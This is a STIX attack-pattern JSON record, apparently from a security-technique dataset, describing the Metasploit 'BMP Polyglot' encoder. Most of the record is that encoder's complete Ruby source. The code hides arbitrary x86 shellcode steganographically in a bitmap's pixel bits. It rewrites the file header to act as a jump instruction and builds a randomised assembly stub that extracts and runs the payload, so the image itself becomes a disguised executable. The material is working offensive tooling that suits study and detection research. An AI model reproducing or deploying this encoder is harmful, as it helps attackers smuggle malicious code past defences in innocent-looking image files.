{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ba88cd6-2b3c-458d-b3ec-a97f6fe46d02",
    "created": "2024-08-14T16:33:19.215618Z",
    "modified": "2024-08-14T16:33:19.215621Z",
    "name": "BMP Polyglot",
    "description": " Encodes a payload in such a way that the resulting binary blob is both valid x86 shellcode and a valid bitmap image file (.bmp). The selected bitmap file to inject into must use the BM (Windows 3.1x/95/NT) header and the 40-byte Windows 3.1x/NT BITMAPINFOHEADER. Additionally the file must use either 24 or 32 bits per pixel as the color depth and no compression. This encoder makes absolutely no effort to remove any invalid characters. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/bmp_polyglot.rb",
            "external_id": "bmp_polyglot.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/poly'\n=begin\n[BITS 32]\n\nglobal _start\n\n_start:\n  pushad                ; backup all registers\n\n  call get_eip          ; get the value of eip\nget_eip:\n  pop esi               ; and put it into esi to use as the source\n  add esi, 0x30         ; advance esi to skip this decoder stub\n  mov edi, esi          ; copy it to edi which is where to start writing\n  add esi, 0x1234       ; increase the source to skip any padding\n  mov ecx, 0x1234       ; set the byte counter\n\nget_byte:               ; <---------------------------------------------------------\\\n  xor eax, eax          ; clear eax which is where our newly decoded byte will go   |\n  push ecx              ; preserve the byte counter                                 |\n  xor ecx, ecx          ; set the counter to 0                                      |\n  mov cl, 8             ; set the counter to 8 (for bits)                           |\nget_bit:                ; <------------------------------------------------------\\  |\n  shl eax, 1            ; shift eax one to make room for the next bit            |  |\n  mov bl, byte [esi]    ; read a byte from the source register                   |  |\n  inc esi               ; advance the source register by a byte                  |  |\n  and bl, 1             ; extract the value of the least-significant bit         |  |\n  or al, bl             ; put the least-significat bit into eax                  |  |\n  dec ecx               ; decrement the bit counter                              |  |\n  jne short get_bit     ; -------------------------------------------------------/  |\n                        ;                                                           |\n  ; get bit loop is done                                                            |\n  pop ecx               ; restore the byte counter                                  |\n  mov byte [edi], al    ; move the newly decoded byte to its final destination      |\n  inc edi               ; increment the destination pointer                         |\n                        ;                                                           |\n  dec ecx               ; decrement the byte counter                                |\n  jne get_byte          ; ----------------------------------------------------------/\n\n  ; get byte loop is done\n  popad                 ; restore all registers\n\n=end\n\n# calculate the smallest increase of a 32-bit little endian integer which is\n# also a valid x86 jmp opcode of the specified minimum size.\nclass SizeCalculator\n\n  BYTE_NOPS = [\n    0x42, # inc edx\n    0x45, # inc ebp\n    0x4a, # dec edx\n    0x4d, # dec ebp\n    0x90, # xchg eax, eax / nop\n    0xf5, # cmc\n    0xf8, # clc\n    0xf9, # stc\n    0xfc, # cld\n    0xfd  # std\n  ]\n\n  def initialize(size, minimum_jump)\n    @original_size = size\n    raise if minimum_jump < 0 || minimum_jump > 0xff\n    @minimum_jump = minimum_jump\n  end\n\n  def calculate\n    possibles = []\n    size = new_size_long\n    possibles << size unless size.nil?\n    size = new_size_short\n    possibles << size unless size.nil?\n    return if possibles.length == 0\n    possibles.min\n  end\n\n  def new_size_long\n    size = [ @original_size ].pack('V').unpack('CCCC')\n\n    0.upto(2) do |i|\n      byte_0 = size[i]\n      byte_1 = size[i + 1]\n      byte_2 = size[i + 2].to_i\n      byte_3 = size[i + 3].to_i\n      byte_4 = size[i + 4].to_i\n      min_jmp = (@minimum_jump - 5 - i)\n\n      if byte_2 + byte_3 + byte_4 > 0  # this jmp would be too large\n        if byte_0 > 0xfd\n          size = increment_size(size, i)\n        end\n        size[i] = round_up_to_nop(byte_0)\n        next\n      end\n\n      if byte_0 > 0xe9\n        if byte_0 > 0xfd\n          size = increment_size(size, i)\n        end\n        size[i] = round_up_to_nop(byte_0)\n      else\n        size[i] = 0xe9\n        byte_1 = min_jmp if byte_1 < min_jmp\n        size[i + 1] = byte_1\n        return size.pack('CCCC').unpack('V')[0]\n      end\n    end\n  end\n\n  def new_size_short\n    return if @minimum_jump > 0x81  # short won't make it in this case (0x7f + 0.upto(2).to_a.max)\n    size = [ @original_size ].pack('V').unpack('CCCC')\n\n    0.upto(2) do |i|\n      byte_0 = size[i]\n      byte_1 = size[i + 1]\n      min_jmp = (@minimum_jump - 2 - i)\n\n      if byte_0 > 0xeb\n        if byte_0 > 0xfd\n          size = increment_size(size, i)\n        end\n        size[i] = round_up_to_nop(byte_0)\n      else\n        size[i] = 0xeb\n        if byte_1 > 0x7f\n          byte_1 = min_jmp\n          size = increment_size(size, i + 1)\n        elsif byte_1 < min_jmp\n          byte_1 = min_jmp\n        end\n        size[i + 1] = byte_1\n        return size.pack('CCCC').unpack('V')[0]\n      end\n    end\n  end\n\n  def size_to_jmp(size)\n    jmp = 0\n    packed = [ size, 0 ].pack('VV')\n\n    until [ \"\\xe9\", \"\\xeb\" ].include?(packed[0])\n      packed = packed[1..-1]\n      jmp += 1\n    end\n\n    if packed[0] == \"\\xe9\"\n      jmp +=  packed[1..4].unpack('V')[0]\n      jmp += 5\n    elsif packed[0] == \"\\xeb\"\n      jmp += packed[1].unpack('C')[0]\n      jmp += 2\n    end\n\n    jmp\n  end\n\n  private\n\n  def increment_size(size, byte)\n    size = size.pack('CCCC').unpack('V')[0]\n    size += (0x0100 << byte * 8)\n    [ size ].pack('V').unpack('CCCC')\n  end\n\n  def round_up_to_nop(opcode)\n    BYTE_NOPS.find { |nop| opcode <= nop }\n  end\nend\n\nclass MetasploitModule < Msf::Encoder\n  Rank = ManualRanking\n\n  DESTEGO_STUB_SIZE = 53\n  # bitmap header sizes\n  BM_HEADER_SIZE = 14\n  DIB_HEADER_SIZE = 40\n\n  def initialize\n    super(\n      'Name'             => 'BMP Polyglot',\n      'Description'      => %q{\n        Encodes a payload in such a way that the resulting binary blob is both\n        valid x86 shellcode and a valid bitmap image file (.bmp). The selected\n        bitmap file to inject into must use the BM (Windows 3.1x/95/NT) header\n        and the 40-byte Windows 3.1x/NT BITMAPINFOHEADER. Additionally the file\n        must use either 24 or 32 bits per pixel as the color depth and no\n        compression. This encoder makes absolutely no effort to remove any\n        invalid characters.\n      },\n      'Author'           => 'Spencer McIntyre',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'References'       =>\n        [\n          [ 'URL'        => 'https://warroom.securestate.com/bmp-x86-polyglot/' ]\n        ]\n    )\n\n    register_options(\n      [\n        OptString.new('BitmapFile', [ true, 'The .bmp file to inject into' ])\n      ],\n      self.class)\n  end\n\n  def can_preserve_registers?\n    true\n  end\n\n  def preserves_stack?\n    true\n  end\n\n  def make_pad(size)\n    (0...size).map { (rand(0x100)).chr }.join\n  end\n\n  def modified_registers\n    # these two registers are modified by the initial BM header\n    #   B 0x42 inc edx\n    #   M 0x4d dec ebp\n    [\n      Rex::Arch::X86::EBP, Rex::Arch::X86::EDX\n    ]\n  end\n\n  # take the original size and calculate a new one that meets the following\n  # requirements:\n  #   - large enough to store all of the image data and the assembly stub\n  #   - is also a valid x86 jmp instruction to land on the assembly stub\n  def calc_new_size(orig_size, stub_length)\n    minimum_jump = BM_HEADER_SIZE + DIB_HEADER_SIZE - 2  # -2 for the offset of the size in the BM header\n    calc = SizeCalculator.new(orig_size + stub_length, minimum_jump)\n    size = calc.calculate.to_i\n    raise EncodingError, 'Bad .bmp, failed to calculate jmp for size' if size < orig_size\n\n    jump = calc.size_to_jmp(size)\n    pre_pad = jump - minimum_jump\n    post_pad = size - orig_size - stub_length - pre_pad\n    return { :new_size => size, :post_pad => post_pad, :pre_pad => pre_pad }\n  end\n\n  # calculate the least number of bits that must be modified to place the\n  # shellcode buffer into the image data\n  def calc_required_lsbs(sc_len, data_len)\n    return 1 if sc_len * 8 <= data_len\n    return 2 if sc_len * 4 <= data_len\n    return 4 if sc_len * 2 <= data_len\n    raise EncodingError, 'Bad .bmp, not enough image data for stego operation'\n  end\n\n  # asm stub that will extract the payload from the least significant bits of\n  # the binary data which directly follows it\n  def make_destego_stub(shellcode_size, padding, lsbs = 1)\n    raise RuntimeError, 'Invalid number of storage bits' unless [1, 2, 4].include?(lsbs)\n    gen_regs = [ 'eax', 'ebx', 'ecx', 'edx' ].shuffle\n    ptr_regs = [ 'edi', 'esi' ].shuffle\n    # declare logical registers\n    dst_addr_reg = Rex::Poly::LogicalRegister::X86.new('dst_addr', ptr_regs.pop)\n    src_addr_reg = Rex::Poly::LogicalRegister::X86.new('src_addr', ptr_regs.pop)\n    ctr_reg = Rex::Poly::LogicalRegister::X86.new('ctr', gen_regs.pop)\n    byte_reg = Rex::Poly::LogicalRegister::X86.new('byte', gen_regs.pop)\n    bit_reg = Rex::Poly::LogicalRegister::X86.new('bit', gen_regs.pop)\n\n    endb = Rex::Poly::SymbolicBlock::End.new\n\n    get_eip_nop = Proc.new { |b| [0x90, 0x40 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample), 0x48 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample)].sample.chr }\n    get_eip = Proc.new { |b|\n      [\n        Proc.new { |b| \"\\xe8\" + [0, 1].sample.chr + \"\\x00\\x00\\x00\" + get_eip_nop.call(b) + (0x58 + b.regnum_of(src_addr_reg)).chr },\n        Proc.new { |b| \"\\xe8\\xff\\xff\\xff\\xff\" + (0xc0 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample)).chr + (0x58 + b.regnum_of(src_addr_reg)).chr },\n      ].sample.call(b)\n    }\n    set_src_addr = Proc.new { |b, o| \"\\x83\" + (0xc0 + b.regnum_of(src_addr_reg)).chr + [ b.offset_of(endb) + o ].pack('c') }\n    set_dst_addr = Proc.new { |b| \"\\x89\" + (0xc0 + (b.regnum_of(src_addr_reg) << 3) + b.regnum_of(dst_addr_reg)).chr }\n    set_byte_ctr = Proc.new { |b| (0xb8 + b.regnum_of(ctr_reg)).chr + [ shellcode_size ].pack('V') }\n    adjust_src_addr = Proc.new { |b| \"\\x81\" + (0xc0 + b.regnum_of(src_addr_reg)).chr + [ padding ].pack('V') }\n    initialize = Rex::Poly::LogicalBlock.new('initialize',\n      Proc.new { |b| \"\\x60\" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) + set_byte_ctr.call(b) },\n      Proc.new { |b| \"\\x60\" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + set_byte_ctr.call(b) + adjust_src_addr.call(b) },\n      Proc.new { |b| \"\\x60\" + get_eip.call(b) + set_src_addr.call(b, -6) + set_byte_ctr.call(b) + set_dst_addr.call(b) + adjust_src_addr.call(b) },\n      Proc.new { |b| \"\\x60\" + get_eip.call(b) + set_byte_ctr.call(b) + set_src_addr.call(b,  -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) },\n      Proc.new { |b| \"\\x60\" + set_byte_ctr.call(b) + get_eip.call(b) + set_src_addr.call(b, -11) + set_dst_addr.call(b) + adjust_src_addr.call(b) },\n    )\n\n    clr_byte_reg = Proc.new { |b| [0x29, 0x2b, 0x31, 0x33].sample.chr + (0xc0 + (b.regnum_of(byte_reg) << 3) + b.regnum_of(byte_reg)).chr }\n    clr_ctr = Proc.new { |b| [0x29, 0x2b, 0x31, 0x33].sample.chr + (0xc0 + (b.regnum_of(ctr_reg) << 3) + b.regnum_of(ctr_reg)).chr }\n    backup_byte_ctr = Proc.new { |b| (0x50 + b.regnum_of(ctr_reg)).chr }\n    set_bit_ctr = Proc.new { |b| (0xb0 + b.regnum_of(ctr_reg)).chr + (8 / lsbs).chr }\n    get_byte_loop = Rex::Poly::LogicalBlock.new('get_byte_loop',\n      Proc.new { |b| clr_byte_reg.call(b) + backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },\n      Proc.new { |b| backup_byte_ctr.call(b) + clr_byte_reg.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },\n      Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + clr_byte_reg.call(b) + set_bit_ctr.call(b) },\n      Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) + clr_byte_reg.call(b) },\n    )\n    get_byte_loop.depends_on(initialize)\n\n    shift_byte_reg = Rex::Poly::LogicalBlock.new('shift_byte_reg',\n      Proc.new { |b| \"\\xc1\" + (0xe0 + b.regnum_of(byte_reg)).chr + lsbs.chr }\n    )\n    read_byte = Rex::Poly::LogicalBlock.new('read_byte',\n      Proc.new { |b| \"\\x8a\" + ((b.regnum_of(bit_reg) << 3) + b.regnum_of(src_addr_reg)).chr }\n    )\n    inc_src_reg = Rex::Poly::LogicalBlock.new('inc_src_reg',\n      Proc.new { |b| (0x40 + b.regnum_of(src_addr_reg)).chr }\n    )\n    inc_src_reg.depends_on(read_byte)\n    get_lsb = Rex::Poly::LogicalBlock.new('get_lsb',\n      Proc.new { |b| \"\\x80\" + (0xe0 + b.regnum_of(bit_reg)).chr + (0xff >> (8 - lsbs)).chr }\n    )\n    get_lsb.depends_on(read_byte)\n    put_lsb = Rex::Poly::LogicalBlock.new('put_lsb',\n      Proc.new { |b| \"\\x08\"+ (0xc0 + (b.regnum_of(bit_reg) << 3) + b.regnum_of(byte_reg)).chr }\n    )\n    put_lsb.depends_on(get_lsb, shift_byte_reg)\n    jmp_bit_loop_body = Rex::Poly::LogicalBlock.new('jmp_bit_loop_body')\n    jmp_bit_loop_body.depends_on(put_lsb, inc_src_reg)\n\n    jmp_bit_loop = Rex::Poly::LogicalBlock.new('jmp_bit_loop',\n      Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + \"\\x75\" + (0xfe + -12).chr }\n    )\n    jmp_bit_loop.depends_on(jmp_bit_loop_body)\n\n    get_bit_loop = Rex::Poly::LogicalBlock.new('get_bit_loop_body', jmp_bit_loop.generate([ Rex::Arch::X86::EBP, Rex::Arch::X86::ESP ]))\n    get_bit_loop.depends_on(get_byte_loop)\n\n    put_byte = Proc.new { |b| \"\\x88\" + (0x00 + (b.regnum_of(byte_reg) << 3) + b.regnum_of(dst_addr_reg)).chr }\n    inc_dst_reg = Proc.new { |b| (0x40 + b.regnum_of(dst_addr_reg)).chr }\n    restore_byte_ctr = Proc.new { |b| (0x58 + b.regnum_of(ctr_reg)).chr }\n    get_byte_post = Rex::Poly::LogicalBlock.new('get_byte_post',\n      Proc.new { |b| put_byte.call(b) + inc_dst_reg.call(b) + restore_byte_ctr.call(b) },\n      Proc.new { |b| put_byte.call(b) + restore_byte_ctr.call(b) + inc_dst_reg.call(b) },\n      Proc.new { |b| restore_byte_ctr.call(b) + put_byte.call(b) + inc_dst_reg.call(b) },\n    )\n    get_byte_post.depends_on(get_bit_loop)\n\n    jmp_byte_loop_body = Rex::Poly::LogicalBlock.new('jmp_byte_loop_body',\n      Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + \"\\x75\" + (0xfe + -26).chr  }\n    )\n    jmp_byte_loop_body.depends_on(get_byte_post)\n\n    finalize = Rex::Poly::LogicalBlock.new('finalize', \"\\x61\")\n    finalize.depends_on(jmp_byte_loop_body)\n\n    return finalize.generate([ Rex::Arch::X86::EBP, Rex::Arch::X86::ESP ])\n  end\n\n  def stegoify(shellcode, data, lsbs = 1)\n    clr_mask = ((0xff << lsbs) & 0xff)\n    set_mask = clr_mask ^ 0xff\n    iter_count = 8 / lsbs\n\n    shellcode.each_char.with_index do |sc_byte, index|\n      sc_byte = sc_byte.ord\n      0.upto(iter_count - 1) do |bit_pos|\n        data_pos = (index * (8 / lsbs)) + bit_pos\n        shift = 8 - (lsbs * (bit_pos + 1))\n\n        d_byte = data[data_pos].ord\n        d_byte &= clr_mask\n        d_byte |= ((sc_byte & (set_mask << shift)) >> shift)\n        data[data_pos] = d_byte.chr\n      end\n    end\n\n    data\n  end\n\n  def validate_dib_header(dib_header)\n    size, _, _, _, bbp, compression, _, _, _, _, _ = dib_header.unpack('VVVvvVVVVVV')\n    raise EncodingError, 'Bad .bmp DIB header, must be 40-byte BITMAPINFOHEADER' if size != DIB_HEADER_SIZE\n    raise EncodingError, 'Bad .bmp DIB header, bits per pixel must be must be either 24 or 32' if bbp != 24 && bbp != 32\n    raise EncodingError, 'Bad .bmp DIB header, compression can not be used' if compression != 0\n  end\n\n  def encode(buf, badchars = nil, state = nil, platform = nil)\n    in_bmp = File.open(datastore['BitmapFile'], 'rb')\n\n    header = in_bmp.read(BM_HEADER_SIZE)\n    dib_header = in_bmp.read(DIB_HEADER_SIZE)\n    image_data = in_bmp.read\n    in_bmp.close\n\n    header, original_size, _, _, original_offset = header.unpack('vVvvV')\n    raise EncodingError, 'Bad .bmp header, must be 0x424D (BM)' if header != 0x4d42\n    validate_dib_header(dib_header)\n\n    lsbs = calc_required_lsbs(buf.length, image_data.length)\n\n    details = calc_new_size(original_size, DESTEGO_STUB_SIZE)\n    destego_stub = make_destego_stub(buf.length, details[:post_pad], lsbs)\n    if destego_stub.length != DESTEGO_STUB_SIZE\n      # this is likely a coding error caused by updating the make_destego_stub\n      # method but not the DESTEGO_STUB_SIZE constant\n      raise EncodingError, 'Bad destego stub size'\n    end\n\n    pre_image_data = make_pad(details[:pre_pad]) + destego_stub + make_pad(details[:post_pad])\n    new_offset = original_offset + pre_image_data.length\n\n    bmp_img = ''\n    bmp_img << [0x4d42, details[:new_size], 0, 0, new_offset].pack('vVvvV')\n    bmp_img << dib_header\n    bmp_img << pre_image_data\n    bmp_img << stegoify(buf, image_data, lsbs)\n    bmp_img\n  end\nend\n"
}